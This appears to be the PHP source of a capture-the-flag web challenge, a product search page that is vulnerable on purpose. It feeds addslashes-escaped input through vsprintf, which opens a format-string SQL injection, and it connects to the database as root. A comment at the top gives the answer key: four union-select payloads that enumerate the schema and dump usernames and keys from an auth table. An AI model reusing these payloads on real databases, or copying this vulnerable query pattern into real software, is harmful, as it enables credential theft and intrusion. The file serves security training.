<?php
ini_set("display_errors", 0);
//solution:
// 1- %1$') union select schema_name,null,null from INFORMATION_SCHEMA.SCHEMATA;--
// 2- %1$') union select table_name,null,null from INFORMATION_SCHEMA.TABLES where table_schema=%1$'auth%1$';--
// 3- %1$') union select column_name,null,null from INFORMATION_SCHEMA.COLUMNS where table_name=%1$'users_erRP9T6C%1$';--
// 4- %1$') union select username,`key`,null from auth.users_erRP9T6C;--
$conn = new PDO("mysql:host=127.0.0.1;", 'root', 'root');
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$stmt = $conn->query("SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME = 'challenge'");
if(!(bool) $stmt->fetchColumn()){
    $conn->query("CREATE DATABASE challenge;");
    $conn->query("CREATE DATABASE auth;");
    $conn->query("USE auth;");
    $sql = file_get_contents('auth.sql');
    $conn->exec($sql);
    $conn->query("USE challenge;");
    $sql = file_get_contents('challenge.sql');
    $conn->exec($sql);
}
$conn = new PDO("mysql:host=127.0.0.1;dbname=challenge", 'root', 'root');
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
?>

<html>
    <head>
        <title>The Challenge Shop</title>
    </head>
    <body style="margin:0;padding:0">
        <div style="width: 100%; height: 40px; background: #1f2833">
            <div style="float: right; margin-right: 20px; margin-top: 10px;"><a href="login.php" style="color:#FFFFFF; font-weight: bold;">Login</a></div>
        </div>
        <div style="margin: auto; margin-top: 20px; text-align: center; width: 300px">
            <form method="get" action="">
                <input type="text" style="height: 40px;" name="s" placeholder="Search our products" value="<?php if(isset($_GET['s'])) echo htmlentities($_GET['s']); ?>">
                <input type="submit" value="Search" style="height: 40px; padding: 10px; border: 0; background: #1f2833; color: #FFFFFF" />
            </form>
        </div>
        <?php
            $stmt = $conn->query(vsprintf("SELECT name, description, active FROM products WHERE active=1", ['']));
            if(isset($_GET['s']) && !empty($_GET['s'])) {
                $s = addslashes($_GET['s']);
                try {
                    $stmt = $conn->query(vsprintf("SELECT name, description, active FROM products WHERE MATCH(name) AGAINST ('$s') OR MATCH(description) AGAINST ('$s') AND active=1", ['']));
                } catch (Exception $e) {
                    $stmt = $conn->query(vsprintf("SELECT name, description, active FROM products WHERE active=1", ['']));
                }
            }
            $rows = $stmt->fetchAll();
            foreach($rows as $product){
            ?>
            <div style="width: 800px; margin: auto">
                <h1><?php echo $product['name'];?></h1>
                <h6><?php echo $product['description'];?></h6>
                <hr />
            </div>
            <?php } ?>
    </body>
</html>
